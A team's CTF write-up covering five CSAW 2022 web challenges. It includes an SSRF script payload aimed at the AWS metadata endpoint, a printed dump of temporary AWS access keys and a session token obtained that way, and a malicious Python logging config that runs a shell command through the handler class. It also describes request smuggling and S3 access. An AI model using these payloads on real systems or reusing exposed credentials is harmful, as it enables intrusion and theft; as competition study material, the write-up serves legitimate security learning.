# CSAW 2022 - full web writeups
## INTRO

We,  ***SOter14***, spotted 1st place in ***Middle East and North Africa*** region, and 13th worldwide out of more than 900 participating teams and got invited to attend the finals, onsite in ABU DHABI - Emirates. 
We managed to solve 27 out of 30 task, and we've got solution for 2 out of the 3 remaining tasks (1 crypto, 1 pwn) working locally but had issues with remote server, hard luck next time!

// insert img of scoreboard and tasks solved



## Word wide web (406 solves)
Given a webpage with lot of \<a\> tags, only one tag contain href attribute with valid path to the next page. Recursively,  every new page visited contains the same thing but with new path to the next page. 

![desc](https://github.com/anas-cherni/CTF-writeups/blob/main/CSAW%20quals%202k2022%20-%20full%20web/world%20wide%20web/desc.png?raw=true)
### Solver
```python
import requests

url = "http://web.chal.csaw.io:5010/"
session = requests.Session()

with session :
	next_word = 'stuff'
	while  True:
		response1 = session.get(url+next_word)
		"""print(session.cookies)"""
		try:
			startingIndex=response1.text.index('href="/')
			endText = response1.text[startingIndex:].index('">')
		except :
			print(response1.text)
			break
		print("next word:",response1.text[7+startingIndex:endText+startingIndex])
		next_word = response1.text[7+startingIndex:endText+startingIndex]
```

![flag](https://github.com/anas-cherni/CTF-writeups/blob/main/CSAW%20quals%202k2022%20-%20full%20web/world%20wide%20web/img.png?raw=true)

## My little website (204 solves)

![desc](https://github.com/anas-cherni/CTF-writeups/blob/main/CSAW%20quals%202k2022%20-%20full%20web/My%20Little%20Website/MylittleWebsite_description.png?raw=true)

There is  a unique feature of converting markdown to pdf, at first when I fetched external ressources and got the result in pdf, I tried to look with ns lookup for what cloud the challenge is hosted on. Once I discovered that it's AWS, one Idea instantly came to my mind : accessing aws meta-data through _169.254.169.254_ 
```mermaid
graph LR;  
 SSRF_169.254.169.254-->AWS_metadata-->SecretKey+SecretId+SecurityToken;
 SecretKey+SecretId+SecurityToken-->Remote_Access  
```

```javascript
<script> top.location='[http://169.254.169.254/latest/meta-data/iam/security-credentials/AmazonSSMRoleForInstancesQuickSetup](http://169.254.169.254/latest/meta-data/)' </script>
```
![pdf](https://github.com/anas-cherni/CTF-writeups/blob/main/CSAW%20quals%202k2022%20-%20full%20web/My%20Little%20Website/ssrfAWS.png?raw=true)

Seems unintended, cuz with the right role / permission, we can cause a serious damage and go beyond getting a simple flag.
> [http://169.254.169.254/latest/meta-data/iam/security-credentials/AmazonSSMRoleForInstancesQuickSetup](http://169.254.169.254/latest/meta-data/iam/security-credentials/AmazonSSMRoleForInstancesQuickSetup?fbclid=IwAR2443rlWP2CjKGlkznRDgnPxigxvi3EubklQlP7Kt3LU262OW1tcOLKHf0)
```javascript
{
"Code" : "Success",
"LastUpdated" : "2022-09-09T17:30:49Z",
"Type" : "AWS-HMAC",
"AccessKeyId" : "ASIAXOT35QYLSAMKCIPN",
"SecretAccessKey" : "LYjUPfpAZ4G+Lw5mQWcTpCvaUTSGAcyatfcLsm2u",
"Token" :
"IQoJb3JpZ2luX2VjELL//////////wEaCXVzLXdlc3QtMiJGMEQCIB3PI9WG6S1VTyQYyd43HkwNtoRzVg+UlB5HboU7CLpUAiASizIAZ
vPFf/qGB0PTbajDaFkQ6yLdMvN6dHlelmWKuyrMBAhLEAAaDDUxMjQzNDczNDYxNSIMTTqcjAUM+9uQb65pKqkE17539UplDbJkH1sSKHE
r5L+rHf3Xm1Qk/87rO9wF5zDEhw/L8YDPqYMGq0erhx/Q/5jXApf0Y5Lx5uTLIHUWoyRA4hdfUDk53RpWKFhh++9Ev/iAbqWhhcldFtEhh
g3S2j00l8oBtLfeGzyjEZWp+m0U0uRDmte9sL09RttOgifuYnq5YXQzveiK+RsQpk/qwNtRnvVNeGuHA+93jhJBtzQw+hhtf6z0iOTaaBy
tDmY2UnQbDC8N+kwBwfNTbem8xbriBZuodOM9nL5kN2ujaiwsRFJRrVD+lUc98cCGfTDZdFll0R9HzmR8bBFCegHmc67Nm49TMckRr6IWs
NmFynP9P9r72VArmxmJ3pc2CeX66qYz4Vce5ahmWYiF0DpM9c7H3UH9tQt/NRQgSTdZ1BrOYGZVkHsUU04TFUz/xMakajQwALtRxKiYUMY
e0DXf2nWMNhr+NWOvrNVdajVAko8n8Whhj7WQ2o4OtXjU/v2uEN695EeBpwMujigxOSAz8fdbtuek15boHgNmfqzBKd8bYj5WS/nCDTBt0
3TTjpVrhAtzIIuHOf0Yo7iHAiYKdcGLHq2DXADRH08F4fRMFJuvC2w1xpkBhIo9sUNAEpDpWuMDcSG0NMrSDyQg4IKgX8848o1GzqRrP8S
53IBZ/XUFXkfFe+n43j0dP6x8LqMUXTxen2/iM69BJ/NezQ+EdfEQFSK/FFeZRM2JJSQ/hhnmDpytOkufrjC/8O2YBjqqAVvYyfsnTbDzB
zTP8kFm17/HUGD/c1sxC8ZGHlJED/8V3auRWlqgMLCG+xxSYee5CY7ehwY9y5ImB6h5WZS+7aBqZR9p1izrahH/zP1xePfP5exYlkcb+OS
Zl9LpLTy2gbcx/MDDz4RTD3wNLsDIxHS+Ikw+bP6EWaqQKlpyt09Q1vfefEVmef74IKufl5//LwBeBSQM5pueWgpqBMiRvY5rBWRfm9xh5
iKg",
"Expiration" : "2022-09-09T23:36:00Z"
}

```
I noticed then an announcement from the author
![announcement](https://github.com/anas-cherni/CTF-writeups/blob/main/CSAW%20quals%202k2022%20-%20full%20web/My%20Little%20Website/admin_note.png?raw=true)

### Solution
My mate m0ngi already dealt with that in the past, his published <a href="https://github.com/M0ngi/CTF-Writeups/tree/main/2022/Hack%20The%20Box%20-%20Cyber%20Apocalypse?fbclid=IwAR3txcsUTyZVST18aU-IHNTmb_icxtzP5_ntZcgLTSaLgDceppoUHlcuiCE#web2"> writeup </a> exposed me directly to the appropriate CVE. 
![sol](https://github.com/anas-cherni/CTF-writeups/blob/main/CSAW%20quals%202k2022%20-%20full%20web/My%20Little%20Website/payload.png?raw=true)
![flag](https://github.com/anas-cherni/CTF-writeups/blob/main/CSAW%20quals%202k2022%20-%20full%20web/My%20Little%20Website/flag.png?raw=true)

## Good Intentions (130 solves)
![](https://github.com/anas-cherni/CTF-writeups/blob/main/CSAW%20quals%202k2022%20-%20full%20web/Good%20Intentions/description.png?raw=true)

Source code tree :
![](https://github.com/anas-cherni/CTF-writeups/blob/main/CSAW%20quals%202k2022%20-%20full%20web/Good%20Intentions/tree.png?raw=true)
>It's a flask app, I opened <strong>routes.py</strong> at first to discover the endpoints behavior.

here's the code:
```python
import json
from application.database import User, Image, db, migrate_db
from application.util import admin_only, generate
import sys, os
from subprocess import PIPE, run

from flask import Blueprint, jsonify, redirect, render_template, request, current_app, send_file
from flask_login import current_user, login_required, login_user, logout_user
from werkzeug.utils import secure_filename

import logging
import logging.config

logger = logging.getLogger(__name__)

web = Blueprint('web', __name__)
api = Blueprint('api', __name__)

"""
Front-end of the site is currently in development but we've put placeholders for now...
"""

def response(message):
    return jsonify({'message': message})

@web.route('/', methods=['GET'])
def landing_page():
    return render_template('landing.html')

#WORK IN PROGRESS
"""@web.route('/login', methods=['GET'])
def login():
    return render_template('login.html')
"""

@api.route('/login', methods=['POST'])
def user_login():

    current_app.logger.debug("Entering login")

    if not request.is_json:
        return response('Missing required parameters!'), 401

    data = request.get_json()
    username = data.get('username', '')
    password = data.get('password', '')

    if not username or not password:
        return response('Missing required parameters!'), 401

    user = User.query.filter_by(username=username).first()

    if not user or not user.password == password:
        return response('Invalid username or password!'), 403

    login_user(user)
    return response('User authenticated successfully!')

#WORK IN PROGRESS
"""@web.route('/register', methods=['GET'])
def register():
    return render_template('register.html')
"""

@api.route('/register', methods=['POST'])
def user_registration():
    
    current_app.logger.debug("Entering register")
    
    if not request.is_json:
        return response('Missing required parameters!'), 401

    data = request.get_json()
    username = data.get('username', '')
    password = data.get('password', '')

    if not username or not password:
        return response('Missing required parameters!'), 401

    user = User.query.filter_by(username=username).first()

    if user:
        return response('User already exists!'), 401

    new_user = User(username=username, password=password)
    db.session.add(new_user)
    db.session.commit()

    return response('User registered successfully!')
    #return redirect('/')

#WORK IN PROGRESS
"""@web.route('/logout')
@login_required
def logout():
    logout_user()
    return redirect('/')
"""


@api.route('/gallery', methods=['GET'])
@login_required
def gallery():
    current_app.logger.debug("Entering gallery") 
    query = Image.query.filter_by(username=current_user.username).all()

    locations = []

    for image in query:
        locations.append(image.location)

    return response(locations)

@api.route('/download_image', methods=['GET'])
@login_required
def download_image():

    current_app.logger.debug("Entering download image")

    if 'file' not in request.args:
        return response('Missing required parameters!'), 401

    query = Image.query.filter_by(location=request.args["file"]).first()

    if query.location:
        return send_file(f"{current_app.config['UPLOAD_FOLDER']}/images/{query.location}")

    else:
        return response("File not found!")

@api.route('/upload', methods=['POST'])
@login_required
def upload_image():
    if 'file' not in request.files or 'label' not in request.form:
        return response('Missing required parameters!'), 401
    
    file = request.files['file']
    label=request.form["label"]

    if file.filename == '':
       return response('Missing required parameters!'), 401

    rand_dir = generate(15)
    upload_dir = f"{current_app.config['UPLOAD_FOLDER']}/images/{rand_dir}/"
    os.makedirs(upload_dir, exist_ok=True)

    filename = secure_filename(str(label + "_" + generate(10)))
    file.save(upload_dir + filename)

    new_file = Image(username=current_user.username, location=f"{rand_dir}/{filename}")
    db.session.add(new_file)
    db.session.commit()

    return response("File successfully uploaded")

#One of the volunteers keeps messing with the logger config. Doing this as a temporary fix so I can fix remotely...
#If you're the one doing it and reading this, please stop.
@api.route('/log_config', methods=['POST'])
@login_required
def log_config():
    if not request.is_json:
        return response('Missing required parameters!'), 401

    data = request.get_json()
    file_name = data.get('filename', '') 

    logging.config.fileConfig(f"{current_app.config['UPLOAD_FOLDER']}/conf/{file_name}")

    return response(data)

#WORK IN PROGRESS
"""@web.route('/admin')
@login_required
@admin_only
def admin_panel():
    pass
"""

# One of the guys cant get his VPN working on his laptop and complains he needs to do some checks remotely...
@api.route('/run_command', methods=['POST'])
@login_required
@admin_only
def remote_exec():
    if not request.is_json:
            return response('Missing required parameters!')

    data = request.get_json()
    command = data.get('command','')
    result = run(command, stdout=PIPE, stderr=PIPE, shell=True)

    return response(result.stdout.decode())

```
### Running the app locally
![](https://github.com/anas-cherni/CTF-writeups/blob/main/CSAW%20quals%202k2022%20-%20full%20web/Good%20Intentions/docker.png?raw=true)
>Getting also my local app exposed publicly, helped me switch smoothly between machines.
![](https://github.com/anas-cherni/CTF-writeups/blob/main/CSAW%20quals%202k2022%20-%20full%20web/Good%20Intentions/ngrok.png?raw=true)  

### Notes
> I used postman for sending requests
* /api/register for signing up a new user
![](https://github.com/anas-cherni/CTF-writeups/blob/main/CSAW%20quals%202k2022%20-%20full%20web/Good%20Intentions/register.png?raw=true)
* /api/login to authenticate the newly created user
![](https://github.com/anas-cherni/CTF-writeups/blob/main/CSAW%20quals%202k2022%20-%20full%20web/Good%20Intentions/login.png?raw=true)
* The presence of /log_config endpoint looks very juicy, as there is an upload feature (+ we can get the path of the uploaded file through /gallery and read it through /download_image endpoints), *** it seems that the whole task is about changing an existing config file. ***

```python
@api.route('/log_config', methods=['POST'])
@login_required
def log_config():
    if not request.is_json:
        return response('Missing required parameters!'), 401

    data = request.get_json()
    file_name = data.get('filename', '') 

    logging.config.fileConfig(f"{current_app.config['UPLOAD_FOLDER']}/conf/{file_name}")

    return response(data)
```
 <a href="https://github.com/raj3shp/python-logging.config-exploit/blob/main/exploit/bad-logger.conf">This repo</a> confirmed my assumptions.
 ### Solution
 <strong>Logic</strong>
 ```mermaid
graph LR;  
 upload_random_file-->Get_its_storage_path-->upload_evil_config-->remote_code_execution-->redirect_flag_to_random_file-->open_random_file  
```
* /api/upload -> upload first random file 
![](https://github.com/anas-cherni/CTF-writeups/blob/main/CSAW%20quals%202k2022%20-%20full%20web/Good%20Intentions/whatever.png?raw=true)
* /api/gallery -> get its name and from the source code we can construct the whole storage path.
 ```python
upload_dir = f"{current_app.config['UPLOAD_FOLDER']}/images/{rand_dir}/"

os.makedirs(upload_dir, exist_ok=True)
```

![](https://github.com/anas-cherni/CTF-writeups/blob/main/CSAW%20quals%202k2022%20-%20full%20web/Good%20Intentions/whatever2.png?raw=true)
 * /api/upload -> upload evil config
 ```
 [loggers]
keys=root,simpleExample

[handlers]
keys=consoleHandler

[formatters]
keys=simpleFormatter

[logger_root]
level=DEBUG
handlers=consoleHandler

[logger_simpleExample]
level=DEBUG
handlers=consoleHandler
qualname=simpleExample
propagate=0

[handler_consoleHandler]
class=__import__('os').system('cat /flag.txt > /app/application/static/images/e4f13e1c1fe5392be35c504d4635af/whatever_dfa55f8c4266d1a841ef')
level=DEBUG
formatter=simpleFormatter
args=(sys.stdout,)

[formatter_simpleFormatter]
format=%(asctime)s - %(name)s - %(levelname)s - %(message)s 
``` 

![](https://github.com/anas-cherni/CTF-writeups/blob/main/CSAW%20quals%202k2022%20-%20full%20web/Good%20Intentions/evil.png?raw=true)

* /api/config_log to enable config
![](https://github.com/anas-cherni/CTF-writeups/blob/main/CSAW%20quals%202k2022%20-%20full%20web/Good%20Intentions/log.png?raw=true)

* /api/download_image -> get the content of the random file
![](https://github.com/anas-cherni/CTF-writeups/blob/main/CSAW%20quals%202k2022%20-%20full%20web/Good%20Intentions/flag.png?raw=true)

>Same steps with remote server to get the real flag

## Smuggling Mail (67 solves)
![](https://github.com/anas-cherni/CTF-writeups/blob/main/CSAW%20quals%202k2022%20-%20full%20web/smuggling%20email/description.png?raw=true)
### Source Code
![](https://github.com/anas-cherni/CTF-writeups/blob/main/CSAW%20quals%202k2022%20-%20full%20web/smuggling%20email/tree.png?raw=true)
Before diving in the source files, the task name indicate that this is a request smuggling challenge;
### Notes
* It's an express Js app with few enpoints.
* The server uses Varnish as proxy for caching, which serve as http accelerator.

```javascript
const { spawn } = require("child_process");
const path = require("path");

const express = require("express");
const kill = require("tree-kill");

const app = express();
const port = 8082;
const timeout = 10000;

app.use(express.json());
app.use(express.urlencoded());

app.use("/", express.static(path.join(__dirname, "public")));
app.use("/admin", express.static(path.join(__dirname, "admin")));

app.post("/waitlist", (req, res) => {
    res.send("Sorry, the waitlist is currently closed.");
});

// Emergency alert email notification system for all residents
app.post("/admin/alert", (req, res) => {
    if (req.body.msg) {
        const proc = spawn("mail", ["-s", "ALERT", "all_residents@localhost"], {timeout});
        proc.stdin.write(req.body.msg);
        proc.stdin.end();
        setTimeout(() => { kill(proc.pid); }, timeout);
    }

    res.end();
});

app.listen(port);

```
> Server.js

And for varnish config, it's clear that it's ignoring every request to /admin and without the required token. In our case we don't care with the condition statements because our goal is to make the proxy forward the request to the server no matter if the condition is verified or not. Also, note that /admin/alert in the code above spawn an execution of os command which means there is a potentiel of arbitrary os injection to retrive the flag.
```javascript
vcl 4.1;

backend default {
    .host = "127.0.0.1:8082";
}

sub vcl_recv {
    if (req.url ~ "/admin" && !(req.http.Authorization ~ "^Basic TOKEN$")) {
        return (synth(403, "Access Denied"));
    }
}

sub vcl_synth {
    if (resp.status == 403) {
        set resp.body = resp.reason;
        return (deliver);
    }
}
```
> varnish.vcl

### Eye-catching part
While reading config files, I noticed the use of to versions of HTTP (http1.1 and http2) .. To be honest I was highly focusing on every bit of that's related to request sending and how the server receive / interpret it.

![](https://github.com/anas-cherni/CTF-writeups/blob/main/CSAW%20quals%202k2022%20-%20full%20web/smuggling%20email/http2.png?raw=true)

![](https://github.com/anas-cherni/CTF-writeups/blob/main/CSAW%20quals%202k2022%20-%20full%20web/smuggling%20email/http1.1.png?raw=true)

Also, when trying a simple POST request to /waitlist that it's allowed, it won't work until you add the -k option (for insecure connection) + --http1.1 to force http1.1 use.

![](https://github.com/anas-cherni/CTF-writeups/blob/main/CSAW%20quals%202k2022%20-%20full%20web/smuggling%20email/proof.png?raw=true)


### H2 CL Desync
James Kettle, Researcher from portswigger tackled the subject in depth. I highly recommend reading his paper about <a href="https://portswigger.net/research/browser-powered-desync-attacks"> HTTP handling anomalies, Client-side desync and Pause-based desync principles. </a>

> The trick behind this chall is stated <a href="https://portswigger.net/research/http2"> here </a>, I really appreciate his approach. 

![](https://github.com/anas-cherni/CTF-writeups/blob/main/CSAW%20quals%202k2022%20-%20full%20web/smuggling%20email/portswigger.png?raw=true)

### Solution

![](https://github.com/anas-cherni/CTF-writeups/blob/main/CSAW%20quals%202k2022%20-%20full%20web/smuggling%20email/flag.png?raw=true)
One last thing to mention is that there is great option in mail command that you can find interesting regarding the arbitrary os command injection, while reading its manual.

![](https://github.com/anas-cherni/CTF-writeups/blob/main/CSAW%20quals%202k2022%20-%20full%20web/smuggling%20email/tilde.png?raw=true)

> When dealing with burp suite repeater, try to disable auto updating for content-length


## LOST IN AMAZON (19 solves)
![](https://github.com/anas-cherni/CTF-writeups/blob/main/CSAW%20quals%202k2022%20-%20full%20web/Lost-in-amazon/description.png?raw=true)
>Only 19 out of 900 temas succeeded in breaking down This task. Luckily great part of the Solution  was my first approach for solving MY LITTLE WEBSITE task, mentioned above.

![](https://github.com/anas-cherni/CTF-writeups/blob/main/CSAW%20quals%202k2022%20-%20full%20web/Lost-in-amazon/homepage.png?raw=true)

One single static page, there is no source code for the task and no interesting client side stuff which means that we should aim for fuzzing directories and files. Hopefully, the organizers released a small version of the mostly known wordlist rockyou.txt : that's a confirms that fuzzing is the starting point of the challenge.
 * /secret revealed a jwt that we'll need later

 ![](https://github.com/anas-cherni/CTF-writeups/blob/main/CSAW%20quals%202k2022%20-%20full%20web/Lost-in-amazon/jwt.png?raw=true)
* Fuzzing recursively with depth of 2 seems to reveal smthg, because we can't do nothing at this level.

![](https://github.com/anas-cherni/CTF-writeups/blob/main/CSAW%20quals%202k2022%20-%20full%20web/Lost-in-amazon/fuzz.png?raw=true)

>/developer/heaven

![](https://github.com/anas-cherni/CTF-writeups/blob/main/CSAW%20quals%202k2022%20-%20full%20web/Lost-in-amazon/withouthCookie.png?raw=true)

We need to add a cookie to authenticate

![](https://github.com/anas-cherni/CTF-writeups/blob/main/CSAW%20quals%202k2022%20-%20full%20web/Lost-in-amazon/withCookie.png?raw=true)

>NICE!! ez ssrf which means ez win!

![](https://github.com/anas-cherni/CTF-writeups/blob/main/CSAW%20quals%202k2022%20-%20full%20web/Lost-in-amazon/metadata.png?raw=true)

>Unlike my first attempt in MyLittleWebsite. This time we don't have security Token, odds are we have access to S3 bucket with that role.

![](https://github.com/anas-cherni/CTF-writeups/blob/main/CSAW%20quals%202k2022%20-%20full%20web/Lost-in-amazon/region.png?raw=true)

>Adding the Secret and Id keys to the config file ~/.aws/credentials


![](https://github.com/anas-cherni/CTF-writeups/blob/main/CSAW%20quals%202k2022%20-%20full%20web/Lost-in-amazon/creds.png?raw=true)

### Final Solution

![](https://github.com/anas-cherni/CTF-writeups/blob/main/CSAW%20quals%202k2022%20-%20full%20web/Lost-in-amazon/cmd1.png?raw=true)

![](https://github.com/anas-cherni/CTF-writeups/blob/main/CSAW%20quals%202k2022%20-%20full%20web/Lost-in-amazon/cmd2.png?raw=true)

![](https://github.com/anas-cherni/CTF-writeups/blob/main/CSAW%20quals%202k2022%20-%20full%20web/Lost-in-amazon/flag.png?raw=true)


## Conclusion
I want to thank the organizers / authors for their effort. kudos to Ophelious and T0m7r00z for pushing this to the limit. All my teammates are heros! PROUD TUNISIANS. SOter14 ftw <3 

n0s













